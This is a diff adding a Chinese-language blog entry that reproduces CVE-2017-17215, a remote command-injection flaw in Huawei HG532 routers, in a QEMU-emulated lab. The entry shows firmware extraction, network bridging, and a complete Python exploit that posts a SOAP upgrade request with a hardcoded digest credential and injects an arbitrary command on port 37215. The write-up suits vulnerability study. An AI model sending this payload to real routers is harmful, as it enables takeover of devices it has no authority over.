@@ -4020,4 +4020,87 @@ insert into tables values(&#39;$email&#39;,&#39;$username&#39;,&#39;$password&#3
         <tag>sql注入</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CVE-2017-17215复现</title>
+    <url>/2025/05/01/CVE-2017-17215%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>前两次的漏洞复现都挺难挺费力的，这次来复现个简单点的：CVE-2017-17215 ，关于华为 HG532 路由器可能存在的远程代码执行。整个的复现过程还是比较顺利的，虽然也踩了不少坑，但解决的还都算快。</p>
+<span id="more"></span>
+
+<h2 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h2><p>用binwalk直接解压</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -Me HG532eV100R001C02B015_upgrade_main.bin</span><br></pre></td></tr></table></figure>
+
+<h2 id="仿真搭建"><a href="#仿真搭建" class="headerlink" title="仿真搭建"></a>仿真搭建</h2><p>环境如下：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>宿主机</td>
+<td>Ubuntu20.04</td>
+</tr>
+<tr>
+<td>内核</td>
+<td>vmlinux-2.6.32-5-4kc-malta</td>
+</tr>
+<tr>
+<td>映像</td>
+<td>debian_squeeze_mips_standard.qcow2</td>
+</tr>
+<tr>
+<td>qemu</td>
+<td>qemu-system-mips</td>
+</tr>
+</tbody></table>
+<p>一开始用的内核是<code>vmlinux-3.2.0-4-4kc-malta</code>这个版本的，但是在执行<code>/bin/mic</code>的时候会报错，报错表示执行<code>/bin/mic</code>的过程中会用到某个驱动或工具只支持内核<code>2.6.20</code>，于是我就换成了更接近的<code>2.6.32-5-4kc</code>（一开始换的是<code>5-5kc</code>，没想到又精准踩坑，启动qemu的时候直接卡住了）是没问题的。</p>
+<p>执行网络配置脚本net.sh：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down</span></span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens33</span><br><span class="line">sudo brctl stp br0 off</span><br><span class="line">sudo brctl setfd br0 1</span><br><span class="line">sudo brctl sethello br0 1</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo brctl show br0</span><br><span class="line">sudo brctl showstp br0</span><br><span class="line">sudo tunctl -t tap0 -u root</span><br><span class="line">sudo brctl addif br0 tap0</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>
+
+<p>执行启动脚本start.sh：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -cpu 74Kf \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel /home/wen/Desktop/mips_qemu_system/vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda /home/wen/Desktop/mips_qemu_system/debian_squeeze_mips_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -nographic -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>
+
+<p>登录查看IP，然后在宿主机上成功ping通即可。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011533794.png" alt="image-20250501153339609" style="zoom:50%;" />
+
+<p>为了方便后面的操作，可以执行以下命令，将路由器的文件系统根目录作为一个临时的chroot环境</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd squashfs-root</span><br><span class="line">mount --bind /proc ./proc</span><br><span class="line">mount --bind /dev ./dev</span><br><span class="line">chroot . /bin/sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-17215">NVD</a>上面对该漏洞的描述可知，<strong>经过身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击</strong>，即漏洞的关键点在于开启37215这个端口号。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011449886.png" alt="image-20250501144936857"></p>
+<p>搜索<code>37215</code>，发现其存在于<code>/bin/mic</code>这个文件</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011633403.png" alt="image-20250501163308229"></p>
+<p>执行<code>/bin/mic</code>后，会占用当前这个终端，且此时网卡<code>eth0</code>的IP没了，网桥<code>br0</code>的IP也变成了192.168.1.1，因此我们也不能ssh连接再开一个终端</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011806872.png" alt="image-20250501165409513" style="zoom:50%;" />
+
+<p>所以我们在ssh连接的终端上执行<code>/bin/mic</code>文件就行了，然后在原终端执行<code>ifconfig eth0 192.168.107.135/24 up</code>，为网卡<code>eth0</code>重新配置IP，如下：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011703040.png" alt="image-20250501170336797" style="zoom:50%;" />
+
+<p>执行<code>netstat -a</code>显示本地已打开的端口，发现此时<code>37215</code>端口已被成功监听</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011706152.png" alt="image-20250501170651774" style="zoom:50%;" />
+
+<p>用<code>nmap -p 37215 192.168.107.135</code>扫描端口，同样显示<code>37215</code>已打开</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011709144.png" alt="image-20250501170918099"  />
+
+<p>接下来我们执行下面的脚本，向端口<code>37215</code>发送恶意数据报以发起攻击</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">Authorization = &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br><span class="line">headers = &#123;&quot;Authorization&quot;: Authorization&#125;</span><br><span class="line"></span><br><span class="line">print(&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;)</span><br><span class="line">cmd = input(&quot;command &gt; &quot;)</span><br><span class="line"></span><br><span class="line">data = f&#x27;&#x27;&#x27;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">    &lt;s:Body&gt;</span><br><span class="line">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line">            &lt;NewStatusURL&gt;;&#123;cmd&#125;;&lt;/NewStatusURL&gt;</span><br><span class="line">            &lt;NewDownloadURL&gt;;&#123;cmd&#125;;&lt;/NewDownloadURL&gt;</span><br><span class="line">        &lt;/u:Upgrade&gt;</span><br><span class="line">    &lt;/s:Body&gt;</span><br><span class="line">&lt;/s:Envelope&gt;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">r = requests.post(&#x27;http://192.168.107.135:37215/ctrlt/DeviceUpgrade_1&#x27;, headers = headers, data = data)</span><br><span class="line">print(&quot;\nstatus_code: &quot; + str(r.status_code))</span><br><span class="line">print(&quot;\n&quot; + r.text)</span><br></pre></td></tr></table></figure>
+
+<p>输入任意命令让其执行，这里我输入<code>mkdir wen</code>来创建一个目录</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011739103.png" alt="1"></p>
+<p>此时之前执行<code>/bin/mic</code>处的回显如下：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011732975.png" alt="image-20250501173246598" style="zoom:50%;" />
+
+<p>同时执行ls，发现目录创建成功</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505011735638.png" alt="image-20250501173538525" style="zoom: 67%;" />
+
+<h2 id="一些疑问"><a href="#一些疑问" class="headerlink" title="一些疑问"></a>一些疑问</h2><p>看其他师傅的文章有提到有CVE披露的报告中说upnp二进制文件是此次漏洞的来源，经过对upnp文件的逆向分析后，我也确实在该文件中发现了命令注入，但是一个作为恶意数据的来源，一作为恶意数据最后被执行的地方，我目前还不知道<code>mic</code>和<code>upnp</code>这两个文件之间的联系，可能这也是我为什么觉得这次的复现很简单了……</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.iotsec-zone.com/article/384#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">一些经典IoT漏洞的分析与复现（新手向） - IOTsec-Zone</a></p>
+<p><a href="https://zikh26.github.io/posts/719b289c.html">CVE-2017-17215复现（华为HG532命令执行） | ZIKH26’s Blog</a></p>
+<p><a href="https://blog.csdn.net/The54No1/article/details/129362750">HG532命令执行漏洞复现（CVE-2017-17215）_安装attifyos v3.0虚拟机-CSDN博客</a></p>
+]]></content>
+      <tags>
+        <tag>IOT安全</tag>
+      </tags>
+  </entry>
 </search>
